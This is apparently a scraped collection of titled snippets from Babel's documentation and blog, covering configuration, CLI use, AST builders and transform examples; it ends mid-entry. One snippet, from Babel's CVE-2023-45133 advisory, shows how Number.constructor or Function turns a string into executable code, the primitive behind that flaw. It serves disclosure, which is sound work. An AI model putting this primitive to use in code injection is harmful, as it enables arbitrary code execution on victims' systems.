https://github.com/babel/website/blob/main/website/blog/2016-09-28-6.16.0.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  presets: [\"@org/babel-preset-name\"], // actual package\n  presets: [\"@org/name\"] // shorthand name\n}\n```\n\n----------------------------------------\n\nTITLE: Makefile for Babel Compilation\nDESCRIPTION: This Makefile automates the process of compiling JavaScript files using Babel. It defines variables for source and destination files, and rules for creating the `lib` directory and compiling each JavaScript file from `src` to `lib`.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/make/usage.md#_snippet_0\n\nLANGUAGE: Makefile\nCODE:\n```\nSRC = $(wildcard src/*.js)\nLIB = $(SRC:src/%.js=lib/%.js)\n\nlib: $(LIB)\nlib/%.js: src/%.js babel.config.json\n\tmkdir -p $(@D)\n\tbabel $< -o $@\n```\n\n----------------------------------------\n\nTITLE: Installing Babili Webpack Plugin\nDESCRIPTION: This snippet shows how to install the `babili-webpack-plugin` as a development dependency using npm. This plugin provides a dedicated way to integrate Babili with Webpack.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-08-26-babili.md#_snippet_12\n\nLANGUAGE: Shell\nCODE:\n```\n$ npm install babili-webpack-plugin --save-dev\n```\n\n----------------------------------------\n\nTITLE: Class Properties Old Behavior (JavaScript)\nDESCRIPTION: This snippet shows the old Babel 6 behavior for class properties when the `loose` option is enabled. The properties are assigned directly.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_21\n\nLANGUAGE: javascript\nCODE:\n```\n// old v6 behavior: [\"@babel/plugin-proposal-class-properties\", { \"loose\": true }]\nvar Bork = function Bork() {\n  this.y = void 0;\n};\n\nBork.a = \"foo\";\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Null Keyword\nDESCRIPTION: Creates a TypeScript `null` keyword node in the AST. Represents the `null` type in TypeScript.  It doesn't take any arguments.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_195\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsNullKeyword();\n```\n\n----------------------------------------\n\nTITLE: CLI Usage: Running Babel with the plugin\nDESCRIPTION: Demonstrates how to use the plugin directly from the command line using the Babel CLI. This runs Babel on script.js and applies the transform-inline-consecutive-adds plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-inline-consecutive-adds.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins transform-inline-consecutive-adds script.js\n```\n\n----------------------------------------\n\nTITLE: Debugging Script with bode-debug Alias (Shell)\nDESCRIPTION: This snippet demonstrates an alternative way to debug a JavaScript file using the `bode-debug` alias for `babel-node-debug`. It requires `babel-node-debug` to be installed, which usually creates the `bode-debug` alias automatically. The command takes the path to the JavaScript file as an argument.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/babel_node_debug/usage.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nbode-debug path/to/script.js\n```\n\n----------------------------------------\n\nTITLE: import.meta usage - JavaScript\nDESCRIPTION: This code snippet demonstrates the usage of `import.meta` property, which provides meta-information about the currently running module.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst size = import.meta.scriptElement.dataset.size || 300;\n```\n\n----------------------------------------\n\nTITLE: Creating a TSUnknownKeyword Node in JavaScript\nDESCRIPTION: This snippet demonstrates how to create a `TSUnknownKeyword` AST node using Babel's `t.tsUnknownKeyword` method. This method doesn't take any arguments.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_223\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsUnknownKeyword();\n```\n\n----------------------------------------\n\nTITLE: ES2015 Class Example\nDESCRIPTION: This code shows an example of an ES2015 class.  Babili can minify this code directly without transpiling to ES5, which is an advantage over traditional minifiers like UglifyJS.  This example demonstrates a simple class with a constructor.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-08-26-babili.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Mangler {\n  constructor(program) {\n    this.program = program;\n  }\n}\n// need this since otherwise Mangler isn't used\nnew Mangler();\n```\n\n----------------------------------------\n\nTITLE: Checking for ModuleDeclaration Nodes in JavaScript\nDESCRIPTION: Checks if a given AST node is a module declaration (Import or Export). It uses the `t.isModuleDeclaration(node)` method from Babel's `types` API. It is deprecated in favor of `ImportOrExportDeclaration` and covers nodes like `ExportAllDeclaration`, `ExportDefaultDeclaration`, `ExportNamedDeclaration`, and `ImportDeclaration`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_283\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isModuleDeclaration(node);\n```\n\n----------------------------------------\n\nTITLE: Checking for FlowDeclaration Nodes in JavaScript\nDESCRIPTION: This code snippet demonstrates how to check if a given AST node is a FlowDeclaration node using the `t.isFlowDeclaration(node)` method in Babel. It covers Flow-specific declaration nodes like DeclareClass, DeclareFunction, and InterfaceDeclaration. The purpose is to identify declaration nodes within Flow type checking.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_268\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isFlowDeclaration(node);\n```\n\n----------------------------------------\n\nTITLE: Checking for Immutable Nodes in JavaScript\nDESCRIPTION: Checks if a given AST node is immutable, meaning no further properties can be defined after creation. It uses the `t.isImmutable(node)` method from Babel's `types` API. It covers nodes like `BigIntLiteral`, `BooleanLiteral`, `NullLiteral`, `StringLiteral`, and various JSX elements.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_275\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isImmutable(node);\n```\n\n----------------------------------------\n\nTITLE: React Constant Elements Binding Fix (JavaScript)\nDESCRIPTION: Shows a fix for incorrect binding of destructured variables related to `transform-react-constant-elements`. This addresses an issue with destructuring parameters being hoisted incorrectly.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_21\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction render({ text }) {\n  return () => (<Component text={text} />);\n}\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction render(_ref) {\n  let text = _ref.text;\n  var _ref2 = <Component text={text} />;\n  return () => _ref2;\n}\n```\n\n----------------------------------------\n\nTITLE: React Constant Elements Optimization JavaScript\nDESCRIPTION: Demonstrates the React constant elements optimization, where React elements are moved outside the function body to be reused. This avoids re-rendering and improves performance by leveraging React's reconciliation mechanism.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport React from \"react\";\n\nfunction render() {\n  return <div className=\"foo\" />;\n}\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport React from \"react\";\n\nvar _ref = <div className=\"foo\" />;\n\nfunction render() {\n  return _ref;\n}\n```\n\n----------------------------------------\n\nTITLE: JavaScript 'this' conversion issue in Babel v6\nDESCRIPTION: This snippet demonstrates an issue in Babel v6 where `this` is incorrectly converted to `undefined` when compiling code that uses the `script` format, causing errors when used with libraries like jQuery. The input is a self-executing anonymous function that passes `this.jQuery` as an argument. Babel v6 incorrectly converts `this` to `undefined` when running in strict mode.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-06-26-on-consuming-and-publishing-es2015+-packages.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Input\n(function($) {\n  // …\n}(this.jQuery));\n```\n\n----------------------------------------\n\nTITLE: Arguments Deoptimization Example (JavaScript)\nDESCRIPTION: This code demonstrates a case where arguments are deoptimized in JavaScript due to shadowing in a nested function. The `test_deopt` function shows unnecessary loop.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-08-16-gsoc-karl-1.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst log = (...args) => console.log(...args);\n\nfunction test_opt(...args) {\n  log(...args);\n}\n\nfunction test_deopt(...args) {\n  const fn = (...args) => log(...args);\n  fn(...args);\n}\n```\n\n----------------------------------------\n\nTITLE: Using Babel Plugin via CLI\nDESCRIPTION: This shell command demonstrates how to use the @babel/plugin-transform-json-strings plugin via the Babel CLI. It requires Babel to be installed globally or locally.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-json-strings.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-json-strings script.js\n```\n\n----------------------------------------\n\nTITLE: Switching to Babel in Webpack\nDESCRIPTION: This snippet demonstrates how to switch from `jsx-loader` to `babel-loader` in Webpack for JSX transformation. It involves modifying the `loader` property in the Webpack configuration.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-02-23-babel-loves-react.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nloaders: [\n  { test: /\\.js$/, exclude: /node_modules/, loader: 'babel-loader'}\n]\n```\n\n----------------------------------------\n\nTITLE: Creating a TopicReference Node in JavaScript\nDESCRIPTION: This snippet shows how to create a `TopicReference` AST node using Babel's `t.topicReference` method. It takes no arguments.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_231\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.topicReference();\n```\n\n----------------------------------------\n\nTITLE: Creating Nullable Type Annotation in JavaScript\nDESCRIPTION: This snippet creates a `NullableTypeAnnotation` AST node using Babel's `t.nullableTypeAnnotation` builder. The `typeAnnotation` parameter must be a `FlowType` node.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_118\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.nullableTypeAnnotation(typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: Creating a TSUndefinedKeyword Node in JavaScript\nDESCRIPTION: This snippet demonstrates how to create a `TSUndefinedKeyword` AST node using Babel's `t.tsUndefinedKeyword` method. This method does not require any arguments.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_221\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsUndefinedKeyword();\n```\n\n----------------------------------------\n\nTITLE: Importing functions from @babel/helper-validator-identifier\nDESCRIPTION: This code snippet demonstrates how to import the various functions from the @babel/helper-validator-identifier package in a JavaScript file. These imported functions provide the capability to validate JavaScript identifier names, keywords, and reserved words.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-validator-identifier.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport {\n  isIdentifierName,\n  isIdentifierStart,\n  isIdentifierChar,\n  isReservedWord,\n  isStrictBindOnlyReservedWord,\n  isStrictBindReservedWord,\n  isStrictReservedWord,\n  isKeyword,\n} from \"@babel/helper-validator-identifier\";\n```\n\n----------------------------------------\n\nTITLE: Embedding a Transistor.fm iframe\nDESCRIPTION: This snippet embeds a podcast episode from Transistor.fm into the webpage using an iframe.  It specifies the source URL of the podcast episode, sets the width and height of the iframe, and disables scrolling. The style attribute is setting the width and height to 100% and 180px respectively.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-07-02-the-babel-podcast.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<iframe src='https://share.transistor.fm/e/b65dd0f9' width='100%' height='180' frameborder='0' scrolling='no' seamless='true' style={{width:\"100%\", height:\"180px\"}}></iframe>\n```\n\n----------------------------------------\n\nTITLE: Fixing block scoping transform for labeled statements (JavaScript)\nDESCRIPTION: This snippet corrects the block scoping transform for declarations within labeled statements, ensuring variables declared within labeled blocks are correctly scoped.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_18\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet x = 10;\nif (1)\n{\n    ca: let x = 20;\n}\n```\n\n----------------------------------------\n\nTITLE: Async/Await Pipeline Desugaring (Alternative)\nDESCRIPTION: This JavaScript snippet shows an alternative, potentially expected desugaring of the `await` pipeline syntax. It illustrates how some users might expect `x |> await f` to become `(await f)(x)`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-07-19-whats-happening-with-the-pipeline-proposal.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n(await f)(x)\n```\n\n----------------------------------------\n\nTITLE: Remapping JSXIdentifier to MemberExpression (JavaScript)\nDESCRIPTION: This snippet addresses how JSXIdentifiers remapped to MemberExpressions are handled in CommonJS transform, fixing issues with transform-react-inline-elements when used with libraries like react-bootstrap.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\n// transform-react-inline-elements\nimport { Modal } from \"react-bootstrap\";\nexport default CustomModal = () => <Modal.Header>foobar</Modal.Header>;\n```\n\n----------------------------------------\n\nTITLE: React Inline Elements Optimization JavaScript\nDESCRIPTION: Illustrates the React inline elements optimization, which inlines React elements as objects instead of using `React.createElement`. This improves performance but should only be enabled in production due to suppressed React warnings.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\n<div className=\"foo\">{bar}<Baz key=\"baz\" /></div>\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n{ type: 'div', props: { className: 'foo', children:\n  [ bar, { type: Baz, props: { }, key: 'baz', ref: null } ]\n}, key: null, ref: null }\n```\n\n----------------------------------------\n\nTITLE: Method Extraction with Promise (ES7)\nDESCRIPTION: This JavaScript (ES7) snippet uses method extraction via the `::` operator to bind `console.log` to the `then` method of a Promise, printing the resolved value.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-05-14-function-bind.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nPromise.resolve(123).then(::console.log);\n```\n\n----------------------------------------\n\nTITLE: Configure Assumptions\nDESCRIPTION: This JSON configuration demonstrates how to enable the `setComputedProperties` assumption. This option can change the way computed properties are handled.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-computed-properties.md#_snippet_7\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"assumptions\": {\n    \"setComputedProperties\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Unsupported Decorator Usage JavaScript\nDESCRIPTION: This code represents an unsupported decorator usage example in JavaScript. It demonstrates decorated class properties, which are currently work in progress.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_13\n\nLANGUAGE: JavaScript\nCODE:\n```\n// decorated class properties\nclass A {\n  @dec name = 0\n}\n```\n\n----------------------------------------\n\nTITLE: Flow Type Argument Parse Example JavaScript\nDESCRIPTION: This example shows how flow parses type arguments as nested binary expressions when `all` is set to `false`.  When `all` is set to `true` or the `@flow` pragma is present, flow will parse flow-specific features.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-flow.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nf < T > e;\n```\n\n----------------------------------------\n\nTITLE: Using Numeric Separators in Hex Literals (JavaScript)\nDESCRIPTION: This JavaScript code showcases the use of numeric separators in hexadecimal literals. It assigns a hexadecimal number with separators and extracts individual byte values through bitwise operations and verifies these values.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-numeric-separator.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Messages are sent as 24 bit values, but should be\n// treated as 3 distinct bytes:\nlet message = 0xa0_b0_c0;\n\n// What's the value of the upper most byte? It's A0, or 160.\n// We can confirm that:\nlet a = (message >> 16) & 0xff;\nconsole.log(a.toString(16), a); // a0, 160\n\n// What's the value of the middle byte? It's B0, or 176.\n// Let's just make sure...\nlet b = (message >> 8) & 0xff;\nconsole.log(b.toString(16), b); // b0, 176\n\n// What's the value of the lower most byte? It's C0, or 192.\n// Again, let's prove that:\nlet c = message & 0xff;\nconsole.log(c.toString(16), b); // c0, 192\n```\n\n----------------------------------------\n\nTITLE: Usage via Node API\nDESCRIPTION: This JavaScript code snippet demonstrates how to use the Babel Node API to transform code using the `transform-simplify-comparison-operators` plugin. It uses `@babel/core` to transform the string \"code\".\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-simplify-comparison-operators.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"transform-simplify-comparison-operators\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Subclassing Array JavaScript\nDESCRIPTION: This code demonstrates subclassing the built-in `Array` class.  It creates a `MyArray` class that extends `Array`. It demonstrates adding elements to the array and checking its length. Partial support is available, with some built-ins not fully subclassable due to ES5 limitations.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_28\n\nLANGUAGE: JavaScript\nCODE:\n```\n// User code of Array subclass\nclass MyArray extends Array {\n    constructor(...args) { super(...args); }\n}\n\nvar arr = new MyArray();\narr[1] = 12;\narr.length == 2\n```\n\n----------------------------------------\n\nTITLE: Creating a TSIndexedAccessType Node in JavaScript\nDESCRIPTION: This snippet demonstrates how to create a `TSIndexedAccessType` AST node using the `t.tsIndexedAccessType` builder function. It takes the object type and the index type as arguments. This node represents accessing a type using an index in TypeScript.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_179\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsIndexedAccessType(objectType, indexType);\n```\n\n----------------------------------------\n\nTITLE: Const Enum Optimized Output\nDESCRIPTION: JavaScript output when `optimizeConstEnums` is enabled. The enum is inlined.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typescript.md#_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\nconsole.log(0);\n```\n\n----------------------------------------\n\nTITLE: Creating a TSExportAssignment Node in JavaScript\nDESCRIPTION: This example shows how to create a `TSExportAssignment` AST node using the `t.tsExportAssignment` builder function.  It accepts an expression to be assigned to the export. This node represents a TypeScript export assignment.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_172\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsExportAssignment(expression);\n```\n\n----------------------------------------\n\nTITLE: Installing the plugin using npm2yarn\nDESCRIPTION: Command line instruction for installing the @babel/plugin-transform-nullish-coalescing-operator using npm. The `--save-dev` flag ensures the plugin is added as a development dependency.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-nullish-coalescing-operator.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-nullish-coalescing-operator\n```\n\n----------------------------------------\n\nTITLE: Export Extensions JavaScript Example\nDESCRIPTION: Demonstrates the use of export extensions, a stage 1 ES7 proposal, that allow exporting defaults and namespaces from external modules. It shows the `export foo from \"bar\"` syntax and its equivalent using import and export statements, as well as exporting a namespace.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport foo from \"bar\";\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport _foo from \"bar\";\nexport { _foo as foo };\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport * as ns from \"mod\";\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport * as _ns from \"mod\";\nexport { _ns as ns };\n```\n\n----------------------------------------\n\nTITLE: Invalid 'this' Access in JavaScript Constructor\nDESCRIPTION: This JavaScript code shows an invalid access to `this` before calling `super()` in a derived class constructor, which is not allowed in Babel v5.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_18\n\nLANGUAGE: javascript\nCODE:\n```\nclass Foo extends Bar {\n  constructor() {\n    this.foo; // `this` access before `super();`\n    super();\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installation: Install Babel Plugin via npm\nDESCRIPTION: Installation instruction for the babel-plugin-minify-numeric-literals Babel plugin. This command installs the plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-numeric-literals.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-minify-numeric-literals --save-dev\n```\n\n----------------------------------------\n\nTITLE: Template Literals Revision Default (JavaScript)\nDESCRIPTION: This snippet shows the default Babel 7 output for template literals with unicode escapes, using the `_taggedTemplateLiteral` helper function.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_25\n\nLANGUAGE: javascript\nCODE:\n```\n// default\nfunction _taggedTemplateLiteral(strings, raw) {\n  return Object.freeze(\n    Object.defineProperties(strings, { raw: { value: Object.freeze(raw) } })\n  );\n}\nvar _templateObject = /*#__PURE__*/ _taggedTemplateLiteral(\n  [void 0],\n  [\"\\\\unicode and \\\\u{55}\"]\n);\ntag(_templateObject);\n```\n\n----------------------------------------\n\nTITLE: Creating a Pipeline Primary Topic Reference in Babel\nDESCRIPTION: Creates a `PipelinePrimaryTopicReference` AST node using the Babel types module.  This node represents the primary topic reference in a pipeline expression. It relies on the Babel's internal types module ('t').\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_138\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.pipelinePrimaryTopicReference();\n```\n\n----------------------------------------\n\nTITLE: Invalid Partial Application Usage JavaScript\nDESCRIPTION: Shows examples of invalid usage of the `?` placeholder in JavaScript, where it is not in the top-level arguments of a call or used with `new` or `super` calls.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-partial-application.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nf(x + ?)          // `?` not in top-level Arguments of call\nx + ?             // `?` not in top-level Arguments of call\n?.f()             // `?` not in top-level Arguments of call\nnew f(?)          // `?` not supported in `new`\nsuper(?)          // `?` not supported in |SuperCall|\n```\n\n----------------------------------------\n\nTITLE: Invalid Class Constructor Example in JavaScript\nDESCRIPTION: This example shows an invalid class constructor in JavaScript where `super()` is not called in a derived class. This results in an error in Babel v5.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_17\n\nLANGUAGE: javascript\nCODE:\n```\nclass Foo extends Bar {\n  constructor() {\n    // no `super();`\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Smart Pipeline - Bare Style\nDESCRIPTION: This JavaScript code demonstrates the \"bare style\" of Smart Pipelines, where a bare identifier is provided as a step in the pipeline, no token is necessary. Useful for simple function calls or property access.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-07-19-whats-happening-with-the-pipeline-proposal.md#_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\nx |> a;\nx |> f.b;\n```\n\n----------------------------------------\n\nTITLE: Creating a NumberTypeAnnotation in JavaScript\nDESCRIPTION: This code snippet shows how to create a `NumberTypeAnnotation` AST node using `t.numberTypeAnnotation()`. This node represents the `number` type in Flow type annotations. No parameters are required for this function.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_120\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.numberTypeAnnotation();\n```\n\n----------------------------------------\n\nTITLE: new.target with Reflect.construct Caveats - JavaScript\nDESCRIPTION: Illustrates the limitations of the plugin when used with `Reflect.construct` and ES5 function classes. The plugin might not transform all `Reflect.construct` cases correctly, especially when dealing with ES5 inheritance patterns. The example highlights situations where `Reflect.construct` may produce unexpected results due to the complexities of simulating ES6 class inheritance in ES5.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-new-target.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction Foo() {\n  console.log(new.target);\n}\n\n// Bar extends Foo in ES5\nfunction Bar() {\n  Foo.call(this);\n}\nBar.prototype = Object.create(Foo.prototype);\nBar.prototype.constructor = Bar;\n\n// Baz does not extend Foo\nfunction Baz() {}\n\nReflect.construct(Foo, []); // => Foo (correct)\nReflect.construct(Foo, [], Bar); // => Bar (correct)\n\nReflect.construct(Bar, []); // => Bar (incorrect, though this is how ES5\n// inheritance is commonly implemented.)\nReflect.construct(Foo, [], Baz); // => undefined (incorrect)\n```\n\n----------------------------------------\n\nTITLE: Object Rest Spread UseBuiltIns Option JavaScript\nDESCRIPTION: Demonstrates the `useBuiltIns` option for the `transform-object-rest-spread` plugin. When enabled, it transforms object rest spread syntax to use the native `Object.assign` method instead of Babel's helper.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-09-28-6.16.0.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"plugins\": [\n    [\"transform-object-rest-spread\", { \"useBuiltIns\": true }]\n  ]\n}\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n// source\nz = { x, ...y };\n// compiled\nz = Object.assign({ x }, y);\n```\n\n----------------------------------------\n\nTITLE: Transpile ES6 File with Ruby Babel Transpiler\nDESCRIPTION: This snippet demonstrates how to use the 'babel/transpiler' gem to transform an ES6 file. It reads the contents of 'foo.es6' and uses Babel to transpile it. Make sure to install the gem before running the script.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/ruby/usage.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nrequire 'babel/transpiler'\nBabel::Transpiler.transform File.read(\"foo.es6\")\n```\n\n----------------------------------------\n\nTITLE: Enable RegExp Duplicate Named Capturing Groups Plugin\nDESCRIPTION: This configures Babel to enable support for the RegExp duplicate named capturing groups proposal using the '@babel/proposal-duplicate-named-capturing-groups-regex' plugin.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2022-09-05-7.19.0.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/proposal-duplicate-named-capturing-groups-regex\"]\n}\n```\n\n----------------------------------------\n\nTITLE: JavaScript output of 'this' conversion issue in Babel v6\nDESCRIPTION: This snippet shows the incorrect output from Babel v6 when compiling the previous JavaScript code. Babel v6 automatically injects 'use strict' and incorrectly converts `this` to `undefined`, leading to the issue.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-06-26-on-consuming-and-publishing-es2015+-packages.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Output\n\"use strict\";\n\n(function ($) {\n  // …\n})(undefined.jQuery);\n```\n\n----------------------------------------\n\nTITLE: Hack-style Pipeline Example\nDESCRIPTION: This Hack code snippet demonstrates the use of the pipeline operator with required placeholders for each right-hand side operation. It shows how to pipe an array through functions for mapping, filtering, and counting.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-07-19-whats-happening-with-the-pipeline-proposal.md#_snippet_0\n\nLANGUAGE: hack\nCODE:\n```\nnamespace Hack\\UserDocumentation\\Operators\\Pipe\\Examples\\MapFilterCountPiped;\n\nfunction piped_example(array<int> $arr): int {\n  return $arr\n    |> \\array_map($x ==> $x * $x, $$)\n    |> \\array_filter($$, $x ==> $x % 2 == 0)\n    |> \\count($$);\n}\n\nvar_dump(piped_example(range(1, 10)));\n```\n\n----------------------------------------\n\nTITLE: Creating a DeclaredPredicate AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.declaredPredicate` to create a declared predicate node in the AST for Flow type annotations. It takes a Flow representing the predicate's value.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_43\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.declaredPredicate(value);\n```\n\n----------------------------------------\n\nTITLE: Object Rest Spread - Export Named Declaration (JavaScript)\nDESCRIPTION: Illustrates object rest spread being used inside an exported named declaration. This demonstrates using destructuring and rest properties within an export statement.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport var { a, ...b } = c; // ExportNamedDeclaration\n```\n\n----------------------------------------\n\nTITLE: TypeScript Interface and Function\nDESCRIPTION: This code snippet defines a TypeScript interface `Person` with `firstName` and `lastName` properties, and a function `greeter` that takes a `Person` object and returns a greeting string. It demonstrates TypeScript syntax for type annotations.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_10\n\nLANGUAGE: TypeScript\nCODE:\n```\ninterface Person {\n  firstName: string;\n  lastName: string;\n}\n\nfunction greeter(person : Person) {\n  return \"Hello, \" + person.firstName + \" \" + person.lastName;\n}\n```\n\n----------------------------------------\n\nTITLE: Safari Class Field Bug Compiled with Import (JavaScript)\nDESCRIPTION: This is a compiled version of the import example, showing how Webpack/CommonJS adds parentheses.  The parentheses around `(0, _dep.hello)()` triggers the Safari bug. This bug is fixed by `@babel/plugin-bugfix-safari-class-field-initializer-scope` when targeting older Safari versions.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2024-07-26-7.25.0.md#_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nvar _dep = /* ... */;\n\nclass A {\n  prop = (0, _dep.hello)();\n}\n```\n\n----------------------------------------\n\nTITLE: Crafting Malicious Function with Number.constructor (JavaScript)\nDESCRIPTION: This snippet illustrates how to create a malicious function using `Number.constructor` or `Function` constructor in JavaScript.  It demonstrates that `Number.constructor('javascript_code_here;')` and `Function('javascript_code_here;')` are equivalent and allows creating an anonymous function that executes the given JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-10-16-cve-2023-45133.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nNumber.constructor('javascript_code_here;');\nFunction('javascript_code_here;');\n```\n\n----------------------------------------\n\nTITLE: Creating a TSFunctionType Node in JavaScript\nDESCRIPTION: This code demonstrates how to create a `TSFunctionType` AST node using the `t.tsFunctionType` builder. It takes optional type parameters, a list of parameters and a type annotation, used to define the type of a function in TypeScript.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_175\n\nLANGUAGE: 